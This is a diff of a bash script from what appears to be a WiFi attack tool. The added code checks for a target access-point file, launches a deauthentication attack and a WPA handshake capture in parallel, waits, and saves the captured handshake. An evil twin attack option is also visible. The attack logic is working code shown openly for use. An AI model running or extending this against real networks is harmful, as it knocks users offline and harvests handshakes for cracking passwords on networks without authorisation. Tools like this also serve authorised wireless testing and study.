@@ -102,8 +102,37 @@ do
     if [[ $attack_flag == 1 ]]
     then
 	    printf "\n[-] initiating attack for captureing handshake. . . \n"
-	    ./python_scripts/p_sniffer.py
-	    select_attack
+	    #./python_scripts/p_sniffer.py
+	    no_of_files=$(ls ap_info_json/ -1q | wc -l)
+
+	    if [[ $no_of_files == 1 ]]
+            then
+		printf "[-] target_ap.json found!\n"
+		rm handshake-*  > /dev/null 2>&1
+		xterm -geometry 93x31+100+35  -hold -e "./python_scripts/capture_handshake.py" &
+		xterm -geometry 93x31+100+550  -hold -e "./python_scripts/deauth_attack.py 1" &
+		printf "[-] capturing . ."
+		sleep_timer=0
+		while [ $sleep_timer -lt 16 ]
+		do
+   			printf " . ."
+   			sleep_timer=`expr $sleep_timer + 1`
+			sleep 5
+		done
+		printf "\n\n"
+		handshake_file=handshake-01.cap
+		if [[ -f $handshake_file  ]]
+		then
+			printf "\n[-] handshake captured! \n"
+			mv handshake-01* handshake_cap/
+		else
+			printf "\n[!!] handshake not captured \n" 
+		fi
+		select_attack
+            else
+		printf "[-] target.json file wasn't found, can't perform this attack\n"
+	    fi
+	    break
     elif [[ $attack_flag == 2 ]]
     then
 	    printf "\n[-] starting EVIL TWIN  attack. . .\n" 
